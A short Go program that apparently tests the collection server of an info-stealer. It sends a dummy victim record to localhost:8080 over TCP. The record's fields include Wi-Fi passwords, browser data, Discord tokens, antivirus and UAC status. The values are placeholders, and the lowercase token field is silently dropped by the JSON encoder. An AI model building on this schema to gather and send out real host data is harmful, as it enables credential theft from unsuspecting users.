package main

import (
	"encoding/json"
	"net"
)

type ConnectionData struct {
	ComputerName    string `json:"computer_name"`
	ComputerOS      string `json:"computer_os"`
	ComputerVersion string `json:"computer_version"`
	TotalMemory     string `json:"total_memory"`
	UpTime          string `json:"up_time"`
	UUID            string `json:"uuid"`
	CPU             string `json:"cpu"`
	GPU             string `json:"gpu"`
	UAC             string `json:"uac"`
	AntiVirus       string `json:"anti_virus"`

	IP       string `json:"ip"`
	ClientIP string `json:"client_ip"`
	Country  string `json:"country"`
	Timezone string `json:"timezone"`

	Disks string `json:"disks"`

	Wifi string `json:"wifi"`

	WebBrowsers    string `json:"web_browsers"`
	discord_tokens string `json:"discord_tokens"`
}

func main() {
	// Connect to the server using socket
	conn, err := net.Dial("tcp", "localhost:8080")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	// Turn this into a JSON stringified object
	testJson := ConnectionData{
		ComputerName:    "TestComputer",
		ComputerOS:      "Windows",
		ComputerVersion: "10",
		TotalMemory:     "16GB",
		UpTime:          "1d",
		UUID:            "1234",
		CPU:             "Intel i7",
		GPU:             "Nvidia RTX 3080",
		UAC:             "Enabled",
		AntiVirus:       "Windows Defender",
		IP:              "192.168.99.1",
		ClientIP:        "1208.123.123.123",
		Country:         "US",
		Timezone:        "PST",
		Disks:           "C: 100GB, D: 200GB",
		Wifi:            "SSID: TestWifi, Password: TestPassword",
		WebBrowsers:     "Chrome, Firefox",
		discord_tokens:  "token1, token2",
	}

	// Send the JSON stringified object to the server
	jsonData, err := json.Marshal(testJson)
	if err != nil {
		panic(err)
	}

	conn.Write(jsonData)
}
